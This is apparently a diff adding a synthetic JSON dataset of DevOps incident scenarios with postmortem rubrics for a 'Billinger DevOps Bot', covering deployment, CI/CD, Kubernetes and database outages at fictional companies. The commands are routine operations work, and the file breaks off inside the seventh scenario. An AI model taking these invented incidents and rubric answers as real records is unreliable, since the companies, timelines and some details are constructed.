@@ -1,0 +1,1018 @@
+{
+  "version": "2.0.0",
+  "platform": "Billinger DevOps Bot",
+  "scenarios": [
+    {
+      "id": "SCEN-001",
+      "scenario_id": "ecommerce_deployment_failure_v24",
+      "company_name": "ShopSphere OmniRetail",
+      "company_type": "E-commerce",
+      "role": "DevOps Engineer",
+      "incident_type": "deployment failure",
+      "severity": "SEV-1 Critical",
+      "title": "Black Friday Canary Deployment Failure on Cart Checkout Service",
+      "summary": "During scheduled canary rollout of checkout service v2.4.0, HTTP 500 error rate spiked to 34% on checkout endpoints, preventing customers from finalizing purchases.",
+      "architecture_context": "AWS EKS cluster running 40 replicas of Node.js checkout service behind AWS ALB Ingress Controller with Redis cluster for cart sessions and Aurora PostgreSQL for orders.",
+      "steps": {
+        "alert": {
+          "source": "Datadog / PagerDuty Alert",
+          "alert_name": "CheckoutServiceHigh5xxRate",
+          "metric": "sum(rate(http_requests_total{service='checkout',status=~'5..'}[2m])) / sum(rate(http_requests_total{service='checkout'}[2m])) > 0.05",
+          "threshold_breached": "34.2% (Threshold: 5.0%)",
+          "payload": {
+            "event_type": "trigger",
+            "incident_key": "cart-checkout-5xx-spike",
+            "description": "CRITICAL: Checkout service error rate at 34.2% on canary deployment v2.4.0",
+            "timestamp": "2026-11-27T08:14:22Z",
+            "urgency": "high"
+          }
+        },
+        "acknowledge": {
+          "protocol": "PagerDuty auto-page on-call primary DevOps Engineer. Acknowledged in 82 seconds (SLA < 5 min).",
+          "communication_channel": "#incident-20261127-checkout-sev1",
+          "incident_commander": "Lead SRE (Sarah Jenkins)",
+          "sla_target_minutes": 15,
+          "initial_actions": "Incident Commander declared SEV-1. Automated Slack bridge created with on-call DevOps, Backend Lead, and Production Support."
+        },
+        "investigation_commands": [
+          {
+            "command": "kubectl get pods -n prod -l app=checkout-service -o wide",
+            "purpose": "Identify distribution of running pods between stable v2.3.9 and canary v2.4.0 versions across nodes."
+          },
+          {
+            "command": "kubectl logs -l app=checkout-service,version=v2.4.0 -n prod --tail=100",
+            "purpose": "Inspect application runtime logs from the failing canary pods to isolate exception stack traces."
+          },
+          {
+            "command": "kubectl describe deployment checkout-service-canary -n prod",
+            "purpose": "Check deployment rollout status, environment variable bindings, and image tags."
+          },
+          {
+            "command": "curl -Iv -H 'Host: checkout.shopsphere.com' http://internal-alb-arn/healthz",
+            "purpose": "Direct HTTP canary probe bypassing CDN cache to verify health endpoint status code and response payload."
+          }
+        ],
+        "root_cause": "The v2.4.0 release included a database migration that renamed the `billing_postal_code` column to `postal_code`. While the canary pods were deployed with the new schema expectations, the production database migration script had failed in CI due to lock timeout on the `orders` table, resulting in missing column exceptions (`PG::UndefinedColumn: ERROR: column 'postal_code' does not exist`).",
+        "mitigation": {
+          "actions": [
+            "Immediately halted canary rollout traffic via Argo Rollouts: `kubectl argo rollouts abort checkout-service -n prod`.",
+            "Routed 100% of ingress traffic back to stable v2.3.9 deployment revision.",
+            "Scaled canary deployment replicas to 0 to prevent rogue database write attempts.",
+            "Verified cart session persistence in Redis remained uncorrupted."
+          ],
+          "time_to_mitigate_minutes": 7
+        },
+        "validation": {
+          "verification_commands": [
+            "kubectl argo rollouts status checkout-service -n prod",
+            "curl -s -o /dev/null -w '%{http_code}' https://checkout.shopsphere.com/healthz",
+            "sum(rate(http_requests_total{service='checkout',status='200'}[5m]))"
+          ],
+          "outcome": "HTTP 500 error rate dropped to 0.02% (baseline background noise). Checkout transaction completion rate restored to 1,450 orders/minute."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "08:12 Z - Canary rollout v2.4.0 initiated (10% traffic weight)",
+            "08:14 Z - Datadog alert triggered; PagerDuty paged on-call DevOps",
+            "08:15 Z - Incident acknowledged; #incident-20261127-checkout-sev1 opened",
+            "08:18 Z - Pod logs identified PG::UndefinedColumn exception",
+            "08:21 Z - Rollout aborted via Argo Rollouts CLI; 100% traffic on v2.3.9",
+            "08:24 Z - Validation synthetic purchases verified; incident closed"
+          ],
+          "five_whys": [
+            "Why did checkouts fail? The v2.4.0 application threw unhandled database column missing errors.",
+            "Why was the column missing? The PostgreSQL database migration script never completed.",
+            "Why did the migration fail? An exclusive table lock timed out during peak morning traffic.",
+            "Why was the canary deployed if the migration failed? The CI pipeline treated DB migration as an asynchronous detached background task rather than a strict pre-deployment gate.",
+            "Why was DB migration detached? Legacy pipeline scripts lacked synchronous state checking for DDL schema updates."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Add synchronous schema migration validation gate in CI/CD pipeline blocking pod deployments until DDL succeeds.",
+              "owner": "DevOps Team"
+            },
+            {
+              "priority": "P1",
+              "task": "Enforce zero-downtime expand/contract database migration pattern (add new column, sync data, deprecate old).",
+              "owner": "Backend Engineering"
+            },
+            {
+              "priority": "P2",
+              "task": "Implement automated rollback triggers in Argo Rollouts based on Datadog 5xx error rate thresholds.",
+              "owner": "SRE Team"
+            }
+          ],
+          "blameless_culture_notes": "The engineer who initiated the deployment followed standard documented procedures. The failure was a systemic gap in CI/CD pipeline gating and database DDL migration design."
+        }
+      }
+    },
+    {
+      "id": "SCEN-002",
+      "scenario_id": "saas_cicd_pipeline_breakage",
+      "company_name": "CloudScale B2B Analytics",
+      "company_type": "SaaS Enterprise",
+      "role": "Developer",
+      "incident_type": "CI/CD pipeline breakage",
+      "severity": "SEV-2 Major",
+      "title": "Global CI/CD Pipeline Failure Blocking Hotfixes Due to Expired OIDC Token Trust",
+      "summary": "All pull request builds and production deployment pipelines across 60 repositories failed simultaneously with cloud authentication errors during AWS ECR image upload.",
+      "architecture_context": "GitHub Actions workflows using GitHub OIDC Provider to assume AWS IAM Roles for AWS ECR, S3, and EKS deployments.",
+      "steps": {
+        "alert": {
+          "source": "GitHub Actions / Slack #devops-alerts",
+          "alert_name": "GlobalPipelineFailureSpike",
+          "metric": "GitHub Actions workflow failure rate > 90% across organization",
+          "threshold_breached": "98% failure rate across 142 active workflow runs",
+          "payload": {
+            "error": "Error: Credentials could not be loaded: OpenIDConnect provider's HTTPS certificate thumbprint verification failed",
+            "workflow": "ci-cd-deploy.yml",
+            "step": "Configure AWS Credentials via OIDC"
+          }
+        },
+        "acknowledge": {
+          "protocol": "Developer on-call escalated to Senior DevOps on Slack #devops-helpdesk. Acknowledged in 4 minutes.",
+          "communication_channel": "#war-room-cicd-outage",
+          "incident_commander": "DevOps Staff Engineer (Alex Rivera)",
+          "sla_target_minutes": 30,
+          "initial_actions": "Notified all engineering teams via Slack announcement to hold non-essential pull request merges while root cause was isolated."
+        },
+        "investigation_commands": [
+          {
+            "command": "gh run view --log-failed",
+            "purpose": "Inspect raw failed step logs from GitHub Actions CLI to capture exact AWS STS error code."
+          },
+          {
+            "command": "aws iam get-open-id-connect-provider --open-id-connect-provider-arn arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com",
+            "purpose": "Check current thumbprint and client IDs configured on AWS IAM OIDC identity provider."
+          },
+          {
+            "command": "openssl s_client -servername token.actions.githubusercontent.com -showcerts -connect token.actions.githubusercontent.com:443 </dev/null 2>/dev/null | openssl x509 -fingerprint -sha1 -noout",
+            "purpose": "Calculate the live SHA-1 fingerprint of GitHub's current intermediate TLS certificate to verify certificate rotation."
+          }
+        ],
+        "root_cause": "GitHub rotated their intermediate TLS certificate for `token.actions.githubusercontent.com`. The AWS IAM OIDC Identity Provider in the company's AWS accounts had hardcoded legacy certificate thumbprints rather than the updated thumbprint list, causing AWS STS `AssumeRoleWithWebIdentity` calls to be rejected with HTTP 401 Unauthorized.",
+        "mitigation": {
+          "actions": [
+            "Executed an emergency Terraform update across all AWS accounts adding the new GitHub intermediate CA thumbprint `6938fd4d98bab03faadb97b34396831e3780aea1` to the IAM OIDC Provider.",
+            "Applied Terraform changes in parallel using automation service role across root and sub-accounts.",
+            "Re-triggered the blocked release pipeline for payment service."
+          ],
+          "time_to_mitigate_minutes": 18
+        },
+        "validation": {
+          "verification_commands": [
+            "aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789012:role/github-actions-deployer --role-session-name test --web-identity-token $TOKEN",
+            "gh workflow run ci-cd-deploy.yml --ref main"
+          ],
+          "outcome": "AWS STS assumed role successfully with valid temporary credentials. 142 queued GitHub Actions workflow runs resumed and completed with green checks."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "14:02 Z - First batch of PR workflows failed with OIDC token error",
+            "14:06 Z - Developer escalated to DevOps in Slack",
+            "14:10 Z - Investigation revealed rotated GitHub TLS certificate thumbprint",
+            "14:22 Z - Terraform IaC applied with updated thumbprints",
+            "14:28 Z - Test workflow passed; all engineer pipelines unblocked"
+          ],
+          "five_whys": [
+            "Why did pipelines fail? AWS rejected the GitHub Actions OIDC web identity token.",
+            "Why did AWS reject it? The TLS certificate thumbprint did not match AWS IAM's OIDC configuration.",
+            "Why didn't it match? GitHub rotated their certificate authorities.",
+            "Why weren't we prepared? AWS IAM requires explicit certificate thumbprints unless using automatic root CA validation.",
+            "Why was the configuration stale? The IAM OIDC provider was created 2 years ago and had not been updated with AWS's new recommended wildcard thumbprints."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Update IAM OIDC provider configuration in Terraform to include both primary and backup thumbprints as recommended by GitHub.",
+              "owner": "DevOps Lead"
+            },
+            {
+              "priority": "P1",
+              "task": "Subscribe to GitHub Engineering and Security Changelog webhooks to get advance notice of infrastructure rotations.",
+              "owner": "Security Team"
+            }
+          ],
+          "blameless_culture_notes": "Certificate rotations from third-party cloud providers are external dependencies. The incident was handled rapidly without blame, and proactive monitoring will be installed."
+        }
+      }
+    },
+    {
+      "id": "SCEN-003",
+      "scenario_id": "healthtech_container_crashloop",
+      "company_name": "MediPulse Health Systems",
+      "company_type": "HealthTech",
+      "role": "Production Support",
+      "incident_type": "container crash loops",
+      "severity": "SEV-1 Critical",
+      "title": "Electronic Health Record (EHR) Ingestion Service Entering CrashLoopBackOff",
+      "summary": "HL7/FHIR medical data ingestion containers crashed repeatedly every 45 seconds upon startup, halting real-time vital telemetry processing for 12 regional hospital networks.",
+      "architecture_context": "Kubernetes 1.29 cluster in HIPAA-compliant AWS GovCloud running 20 pods of patient-telemetry-consumer reading from Apache Kafka topics.",
+      "steps": {
+        "alert": {
+          "source": "Prometheus Alertmanager / PagerDuty",
+          "alert_name": "KubePodCrashLooping",
+          "metric": "rate(kube_pod_container_status_restarts_total{namespace='ehr-prod',pod=~'patient-telemetry.*'}[5m]) * 60 > 2",
+          "threshold_breached": "Restart rate: 4 restarts/min across all 20 pods",
+          "payload": {
+            "namespace": "ehr-prod",
+            "pod_prefix": "patient-telemetry-consumer",
+            "container": "fhir-parser",
+            "exit_code": 137,
+            "state": "CrashLoopBackOff"
+          }
+        },
+        "acknowledge": {
+          "protocol": "Production Support L2 paged via PagerDuty on-call rotation. Acknowledged in 45 seconds.",
+          "communication_channel": "#inc-ehr-crashloop-2026",
+          "incident_commander": "Healthcare Operations SRE Lead",
+          "sla_target_minutes": 10,
+          "initial_actions": "Verified HIPAA compliance breach safeguards; activated immediate clinical emergency operational fallback protocols."
+        },
+        "investigation_commands": [
+          {
+            "command": "kubectl get pods -n ehr-prod -l app=patient-telemetry -o wide",
+            "purpose": "Check replica statuses, node distribution, and restart counts."
+          },
+          {
+            "command": "kubectl describe pod patient-telemetry-consumer-6d8b9-x7q9w -n ehr-prod",
+            "purpose": "Inspect Last State termination reason, exit code, and OOMKilled flag."
+          },
+          {
+            "command": "kubectl logs patient-telemetry-consumer-6d8b9-x7q9w -n ehr-prod -c fhir-parser --previous --tail=100",
+            "purpose": "Retrieve memory allocation trace and JVM garbage collection logs right before container termination."
+          },
+          {
+            "command": "dmesg -T | grep -E -i 'oom|killed process' | tail -n 20",
+            "purpose": "Check Linux host kernel logs on the worker node to verify kernel cgroup memory eviction."
+          }
+        ],
+        "root_cause": "The patient telemetry pods had a Kubernetes memory limit of 2GiB, but the JVM was started with `-XX:MaxRAMPercentage=80.0` combined with off-heap Netty buffer allocation for high-throughput HL7 streaming. A sudden payload batch of 25MB high-resolution DICOM diagnostic image attachments consumed all native memory, causing total process memory to reach 2.15GiB, triggering Linux kernel cgroup OOM Killer (Exit Code 137).",
+        "mitigation": {
+          "actions": [
+            "Patched the Deployment memory resource limits from 2Gi to 4Gi: `kubectl set resources deployment patient-telemetry-consumer -n ehr-prod --limits=memory=4Gi --requests=memory=2Gi`.",
+            "Configured JVM `-XX:MaxDirectMemorySize=512m` to cap Netty off-heap buffer expansion.",
+            "Monitored rollout of patched pods and observed stable consumption at 2.4GiB under active DICOM ingestion."
+          ],
+          "time_to_mitigate_minutes": 11
+        },
+        "validation": {
+          "verification_commands": [
+            "kubectl get pods -n ehr-prod -l app=patient-telemetry -w",
+            "kubectl top pods -n ehr-prod -l app=patient-telemetry",
+            "kafka-consumer-groups.sh --bootstrap-server kafka:9092 --describe --group patient-telemetry-group"
+          ],
+          "outcome": "All 20 pods running stably with 0 restarts. Kafka consumer lag dropped from 450,000 messages to 0 within 8 minutes."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "10:15 Z - Regional hospital transferred bulk DICOM image archives",
+            "10:17 Z - Pods began crashing with Exit Code 137 (OOMKilled)",
+            "10:18 Z - PagerDuty alerted Production Support",
+            "10:22 Z - Investigation identified off-heap memory exhaustion",
+            "10:27 Z - Memory limits doubled and direct memory capped via kubectl patch",
+            "10:35 Z - Kafka backlog fully processed; zero data loss verified"
+          ],
+          "five_whys": [
+            "Why did containers crash? The Linux kernel killed the container with SIGKILL (Exit 137).",
+            "Why did the kernel kill it? The container exceeded its 2GiB cgroup memory limit.",
+            "Why did memory exceed 2GiB? Large DICOM attachments filled native Netty direct memory buffers.",
+            "Why wasn't Netty memory capped? The JVM flags only bounded heap memory, leaving off-heap memory unbounded.",
+            "Why was the limit set to only 2GiB? The original capacity testing only used small JSON FHIR records without testing large binary payloads."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Separate large binary medical attachments (DICOM) to an asynchronous S3 pre-signed upload pipeline rather than passing through Kafka.",
+              "owner": "Data Architecture"
+            },
+            {
+              "priority": "P1",
+              "task": "Implement cgroup memory pressure alerts at 85% container utilization in Prometheus.",
+              "owner": "SRE Team"
+            },
+            {
+              "priority": "P2",
+              "task": "Conduct load testing with maximum allowed DICOM payload sizes.",
+              "owner": "QA Team"
+            }
+          ],
+          "blameless_culture_notes": "Clinical telemetry remained safely buffered in Kafka during the crash loop; zero data was lost. The memory limit calibration will be incorporated into the Production Readiness Review (PRR)."
+        }
+      }
+    },
+    {
+      "id": "SCEN-004",
+      "scenario_id": "saas_k8s_pod_eviction_storm",
+      "company_name": "CloudScale B2B Analytics",
+      "company_type": "SaaS Enterprise",
+      "role": "SRE",
+      "incident_type": "k8s pod evictions",
+      "severity": "SEV-1 Critical",
+      "title": "Cascading Kubernetes Pod Eviction Storm Due to Ephemeral Storage Exhaustion",
+      "summary": "Over 120 critical microservice pods were evicted concurrently across 15 worker nodes, leading to severe degraded capacity and customer API request drops.",
+      "architecture_context": "Production EKS cluster with 60 c5.4xlarge EC2 worker nodes running container workloads with EBS root volumes.",
+      "steps": {
+        "alert": {
+          "source": "Datadog / Prometheus Alertmanager",
+          "alert_name": "KubernetesHighPodEvictionRate",
+          "metric": "sum(rate(kube_pod_status_reason{reason='Evicted'}[5m])) > 5",
+          "threshold_breached": "28 evictions/min (Threshold: 5/min)",
+          "payload": {
+            "cluster": "prod-us-east-1",
+            "evicted_pods_count": 124,
+            "node_conditions": "DiskPressure=True across 15 worker nodes"
+          }
+        },
+        "acknowledge": {
+          "protocol": "SRE on-call paged. Incident commander assigned within 90 seconds.",
+          "communication_channel": "#incident-pod-evictions",
+          "incident_commander": "Staff SRE (David Chen)",
+          "sla_target_minutes": 15,
+          "initial_actions": "SRE on-call cordoned affected nodes to prevent scheduler eviction ping-pong."
+        },
+        "investigation_commands": [
+          {
+            "command": "kubectl get nodes -o custom-columns=NAME:.metadata.name,DISKPRESSURE:.status.conditions[?(@.type=='DiskPressure')].status",
+            "purpose": "Identify all cluster nodes currently experiencing DiskPressure."
+          },
+          {
+            "command": "kubectl get pods -A --field-selector=status.phase=Failed -o jsonpath='{.items[?(@.status.reason==\"Evicted\")].metadata.name}'",
+            "purpose": "List all evicted pods across namespaces to assess blast radius."
+          },
+          {
+            "command": "ssh node-worker-15 'df -h /var/lib/kubelet && du -sh /var/lib/kubelet/pods/* | sort -hr | head -10'",
+            "purpose": "Inspect filesystem disk consumption on a failing node to pinpoint the rogue directory filling ephemeral storage."
+          },
+          {
+            "command": "crictl images && crictl ps -a",
+            "purpose": "Check container runtime image cache and container status on the affected node."
+          }
+        ],
+        "root_cause": "A newly deployed analytics worker service wrote uncompressed temporary CSV export files directly to local container emptyDir volumes (`/tmp/exports/`) without size limits. When export jobs processed large client datasets, emptyDir consumption exceeded 80GB on worker root volumes, triggering Kubelet hard eviction thresholds (`imagefs.available < 15%`). Kubelet marked nodes with `DiskPressure` and aggressively evicted pods.",
+        "mitigation": {
+          "actions": [
+            "Cleaned evicted dead pod metadata: `kubectl delete pods --field-selector=status.phase=Failed -A`.",
+            "Scaled down the offending analytics exporter deployment to 0 replicas.",
+            "Increased EC2 worker node root volume sizes from 100GB to 300GB using AWS EBS elastic volume expansion.",
+            "Configured ephemeral storage requests and limits on the analytics deployment: `resources.limits.ephemeral-storage: 5Gi`."
+          ],
+          "time_to_mitigate_minutes": 14
+        },
+        "validation": {
+          "verification_commands": [
+            "kubectl get nodes -o wide | grep -i pressure",
+            "kubectl get pods -n prod -l app=analytics-exporter",
+            "kubectl top nodes"
+          ],
+          "outcome": "All nodes returned to DiskPressure=False. Core microservice pods rescheduled smoothly to healthy nodes with zero ongoing evictions."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "16:40 Z - Scheduled analytics batch export job started",
+            "16:48 Z - Worker node root volumes reached 85% capacity",
+            "16:50 Z - Kubelet triggered DiskPressure eviction cascade",
+            "16:52 Z - SRE paged; cordoned failing nodes",
+            "16:58 Z - Analytics deployment scaled down; dead evicted pods cleared",
+            "17:04 Z - EBS root volumes expanded to 300GB; cluster healthy"
+          ],
+          "five_whys": [
+            "Why were pods evicted? The Kubelet evicted pods due to DiskPressure.",
+            "Why did DiskPressure trigger? The /var/lib/kubelet filesystem exceeded 85% disk usage.",
+            "Why was disk usage high? A container wrote 80GB of uncompressed CSVs to an emptyDir volume.",
+            "Why wasn't the container stopped before filling the disk? The pod manifest did not specify `ephemeral-storage` resource limits.",
+            "Why were ephemeral limits omitted? Kubernetes admission control did not mandate ephemeral storage limits."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Enforce Kyverno admission policy requiring ephemeral-storage requests and limits on all container manifests.",
+              "owner": "Platform Engineering"
+            },
+            {
+              "priority": "P1",
+              "task": "Stream export files directly to S3 via multi-part upload rather than buffering to local disk.",
+              "owner": "Data Team"
+            },
+            {
+              "priority": "P2",
+              "task": "Set Prometheus alert on node filesystem available percentage at 75% warning.",
+              "owner": "Observability Team"
+            }
+          ],
+          "blameless_culture_notes": "Developers utilized standard emptyDir volumes without realizing local storage was shared with the Kubelet image cache. Adding admission guardrails protects both developers and cluster stability."
+        }
+      }
+    },
+    {
+      "id": "SCEN-005",
+      "scenario_id": "fintech_split_brain_etcd_patroni",
+      "company_name": "VaultPay Global",
+      "company_type": "Fintech",
+      "role": "SRE",
+      "incident_type": "split-brain state",
+      "severity": "SEV-1 Critical",
+      "title": "High-Availability Database Cluster Split-Brain Partition Between Primary and Secondary DC",
+      "summary": "Network transit fiber flap caused a cross-region partition in a 3-node Patroni/PostgreSQL cluster, risking split-brain dual primary leaders and conflicting ledger transactions.",
+      "architecture_context": "Multi-region PostgreSQL high-availability cluster managed by Patroni with DCS (Distributed Consensus Store) running across 3 AWS Availability Zones.",
+      "steps": {
+        "alert": {
+          "source": "Patroni Health API / PagerDuty",
+          "alert_name": "PatroniClusterQuorumDegraded",
+          "metric": "patroni_is_leader == 1 count across cluster != 1",
+          "threshold_breached": "DCS heartbeat timeout; network partition detected between AZ-a and AZ-c",
+          "payload": {
+            "cluster_name": "postgres-ledger-prod",
+            "status": "PartitionActive",
+            "primary_node": "pg-node-01 (AZ-a)",
+            "suspected_leader": "pg-node-03 (AZ-c)"
+          }
+        },
+        "acknowledge": {
+          "protocol": "SRE on-call paged alongside Principal Database Administrator. Acknowledged in 60 seconds.",
+          "communication_channel": "#inc-ledger-db-splitbrain",
+          "incident_commander": "Director of SRE (Mark Vance)",
+          "sla_target_minutes": 5,
+          "initial_actions": "Enforced immediate read-only mode on application API connection pools to freeze financial ledger writes."
+        },
+        "investigation_commands": [
+          {
+            "command": "patronictl -c /etc/patroni/patroni.yml list",
+            "purpose": "Display current cluster topology, node roles, replication lag, and leader lock status."
+          },
+          {
+            "command": "etcdctl --endpoints=https://etcd1:2379,https://etcd2:2379,https://etcd3:2379 endpoint health",
+            "purpose": "Verify distributed consensus health and quorum across the etcd cluster."
+          },
+          {
+            "command": "ssh pg-node-01 'psql -U postgres -c \"SELECT pg_is_in_recovery();\"'",
+            "purpose": "Check if node-01 believes it is read-write primary (returns false) or standby (returns true)."
+          },
+          {
+            "command": "ssh pg-node-03 'psql -U postgres -c \"SELECT pg_is_in_recovery();\"'",
+            "purpose": "Check if node-03 promoted itself during the network isolation."
+          }
+        ],
+        "root_cause": "A transient AWS Direct Connect network partition isolated AZ-a from the rest of the cluster. Node-01 was running in AZ-a and lost communication with the etcd majority quorum (AZ-b and AZ-c). Due to an outdated Patroni watchdog configuration (`use_watchdog: false`), node-01 did not immediately self-terminate via hardware watchdog when its DCS leader lease expired, while node-03 in AZ-c was elected new leader by the quorum, creating a temporary dual-primary risk window.",
+        "mitigation": {
+          "actions": [
+            "Executed emergency fencing on node-01: `systemctl stop patroni && systemctl stop postgresql` via out-of-band console.",
+            "Verified node-03 was the sole active leader holding the DCS leader lease with valid WAL timeline.",
+            "Re-enabled application database write connection pools pointing strictly to node-03.",
+            "Rejoined node-01 as a read-only replica using `patronictl reinit postgres-ledger-prod pg-node-01` via pg_rewind."
+          ],
+          "time_to_mitigate_minutes": 9
+        },
+        "validation": {
+          "verification_commands": [
+            "patronictl -c /etc/patroni/patroni.yml list",
+            "psql -h pg-rw-lb.internal -U ledger_app -d ledger -c 'SELECT now();'",
+            "psql -U postgres -c 'SELECT client_addr, state, sync_state FROM pg_stat_replication;'"
+          ],
+          "outcome": "Cluster state verified: pg-node-03 is sole Leader; pg-node-01 and pg-node-02 are streaming Standby replicas with 0 bytes lag. Full ledger integrity audit confirmed zero conflicting transactions."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "03:14 Z - AWS AZ-a inter-AZ transit network flap",
+            "03:15 Z - etcd lease expired; node-03 elected leader",
+            "03:16 Z - SRE paged; ledger API put in read-only maintenance",
+            "03:19 Z - Node-01 manually fenced via SSH",
+            "03:23 Z - Node-01 rewound and rejoined as standby; write traffic resumed",
+            "03:40 Z - Financial transaction reconciliation script confirmed 100% data consistency"
+          ],
+          "five_whys": [
+            "Why was there a split-brain risk? Two database instances both considered themselves the primary leader.",
+            "Why didn't node-01 demote itself? The network partition prevented it from renewing its leader key, but the process didn't self-terminate.",
+            "Why didn't it self-terminate? Linux software watchdog (`/dev/watchdog`) was disabled in the Patroni configuration.",
+            "Why was watchdog disabled? An OS upgrade had overwritten the watchdog kernel module configuration.",
+            "Why wasn't this caught? Chaos engineering failover tests had not been run in the past 6 months."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Enable and enforce Linux kernel watchdog device (`/dev/watchdog`) in Patroni configuration across all database nodes.",
+              "owner": "DBA / SRE Team"
+            },
+            {
+              "priority": "P1",
+              "task": "Implement automated Ansible compliance playbooks verifying watchdog active status weekly.",
+              "owner": "DevOps Team"
+            },
+            {
+              "priority": "P2",
+              "task": "Schedule monthly automated GameDay network partition simulations.",
+              "owner": "Chaos Engineering Team"
+            }
+          ],
+          "blameless_culture_notes": "The rapid decision by the SRE to freeze write pools prevented any ledger divergence. Systemic improvements to hardware watchdog enforcement will permanently prevent this risk."
+        }
+      }
+    },
+    {
+      "id": "SCEN-006",
+      "scenario_id": "ecommerce_db_connection_starvation",
+      "company_name": "ShopSphere OmniRetail",
+      "company_type": "E-commerce",
+      "role": "Engineering Manager",
+      "incident_type": "database connection starvation",
+      "severity": "SEV-1 Critical",
+      "title": "PostgreSQL Connection Pool Exhaustion Halting Global Checkout Operations",
+      "summary": "PostgreSQL database reached maximum client connection limit (5,000 connections), rejecting all new application connections with 'FATAL: remaining connection slots are reserved for non-replication superuser connections'.",
+      "architecture_context": "AWS Aurora PostgreSQL 15 cluster servicing 150 Kubernetes microservice replicas with client-side HikariCP connection pooling.",
+      "steps": {
+        "alert": {
+          "source": "AWS CloudWatch / PagerDuty",
+          "alert_name": "AuroraDBConnectionsExhausted",
+          "metric": "DatabaseConnections > 4950",
+          "threshold_breached": "5,000 active connections (100% saturation)",
+          "payload": {
+            "DBClusterIdentifier": "aurora-pg-orders-prod",
+            "ErrorMessage": "FATAL: sorry, too many clients already",
+            "Impact": "Global storefront checkout and inventory reservation failure"
+          }
+        },
+        "acknowledge": {
+          "protocol": "Engineering Manager paged and convened incident war room within 2 minutes.",
+          "communication_channel": "#inc-db-starvation-warroom",
+          "incident_commander": "Engineering Manager (Lisa Wong)",
+          "sla_target_minutes": 10,
+          "initial_actions": "Coordinated between Frontend, Backend, and Platform leads to identify runaway microservices opening unbounded connections."
+        },
+        "investigation_commands": [
+          {
+            "command": "psql -h aurora-orders.internal -U dbadmin -d orders -c \"SELECT client_addr, usename, state, count(*) FROM pg_stat_activity GROUP BY 1,2,3 ORDER BY count DESC;\"",
+            "purpose": "Identify which microservice client IP addresses and users are consuming the connection pool."
+          },
+          {
+            "command": "psql -h aurora-orders.internal -U dbadmin -d orders -c \"SELECT pid, age(clock_timestamp(), query_start), state, query FROM pg_stat_activity WHERE state != 'idle' ORDER BY 2 DESC LIMIT 10;\"",
+            "purpose": "Locate long-running locked queries holding connections open."
+          },
+          {
+            "command": "kubectl get pods -A -l app=recommendation-service --no-headers | wc -l",
+            "purpose": "Verify replica count of non-critical services querying the primary database."
+          }
+        ],
+        "root_cause": "A flash sale caused the Kubernetes Horizontal Pod Autoscaler (HPA) for the `recommendation-service` to scale from 10 to 120 pods. Each pod was configured with a default HikariCP connection pool of 40 minimum/maximum connections pointing directly to the primary read-write database rather than read replicas, consuming 4,800 connections instantly (120 * 40 = 4,800), starving the mission-critical `checkout-service`.",
+        "mitigation": {
+          "actions": [
+            "Terminated idle connections from recommendation service: `psql -c \"SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename='recommendation_user' AND state='idle';\"`.",
+            "Scaled down `recommendation-service` deployment replicas from 120 to 15.",
+            "Repointed recommendation service database endpoint configuration to the Aurora Read-Only Replica endpoint.",
+            "Deployed PgBouncer connection pooler in transaction pooling mode as a buffer in front of Aurora."
+          ],
+          "time_to_mitigate_minutes": 12
+        },
+        "validation": {
+          "verification_commands": [
+            "psql -h aurora-orders.internal -U dbadmin -d orders -c \"SELECT count(*) FROM pg_stat_activity;\"",
+            "curl -Iv https://api.shopsphere.com/v1/checkout/health"
+          ],
+          "outcome": "Active database connections dropped from 5,000 to 420. Checkout API response latency dropped from 8,500ms back to 45ms. Checkout transactions fully operational."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "19:00 Z - Flash sale marketing campaign launched",
+            "19:04 Z - Recommendation service auto-scaled to 120 pods",
+            "19:06 Z - Aurora database reached 5,000 connection ceiling",
+            "19:08 Z - Engineering Manager convened cross-functional war room",
+            "19:14 Z - Recommendation idle connections terminated; pods scaled down",
+            "19:20 Z - Traffic shifted to Aurora Read Replica; full recovery"
+          ],
+          "five_whys": [
+            "Why did checkouts fail? The database refused connections with 'too many clients'.",
+            "Why were there too many connections? 120 recommendation service pods opened 40 connections each.",
+            "Why did recommendation service connect to the primary DB? The application configuration pointed to the cluster read-write endpoint instead of read-only replica.",
+            "Why did each pod open 40 connections? Default connection pool settings were never tuned for auto-scaling workloads.",
+            "Why wasn't an intermediary connection pooler used? Architectural roadmap item for PgBouncer had been deferred."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Mandate AWS RDS Proxy or PgBouncer for all services connecting to PostgreSQL.",
+              "owner": "Platform Engineering"
+            },
+            {
+              "priority": "P1",
+              "task": "Audit and tune all service HikariCP connection pool maximums (reduce default from 40 to 5).",
+              "owner": "Backend Services"
+            },
+            {
+              "priority": "P2",
+              "task": "Enforce strict read-only replica endpoint usage for non-transactional reporting and analytics services.",
+              "owner": "Database Team"
+            }
+          ],
+          "blameless_culture_notes": "The team responded swiftly to isolate the non-critical service. Deploying connection poolers and right-sizing pool sizes will prevent future autoscaling starvation."
+        }
+      }
+    },
+    {
+      "id": "SCEN-007",
+      "scenario_id": "saas_ssl_certificate_expiration",
+      "company_name": "CloudScale B2B Analytics",
+      "company_type": "SaaS Enterprise",
+      "role": "DevOps Engineer",
+      "incident_type": "SSL expiration",
+      "severity": "SEV-1 Critical",
+      "title": "Wildcard TLS/SSL Certificate Expiration on Public API Gateway",
+      "summary": "Public API wildcard certificate `*.cloudscale.io` expired at 00:00 UTC, causing modern web browsers and B2B SDK clients to immediately block all API traffic with NET::ERR_CERT_DATE_INVALID.",
+      "architecture_context": "Cloudflare Edge CDN routing to AWS Application Load Balancers with AWS Certificate Manager (ACM) and Let's Encrypt automated cert-manager on Kubernetes.",
+      "steps": {
+        "alert": {
+          "source": "External Pingdom Synthetic Monitoring / PagerDuty",
+          "alert_name": "SSLCertificateExpired",
+          "metric": "probe_ssl_earliest_cert_expiry - time() < 0",
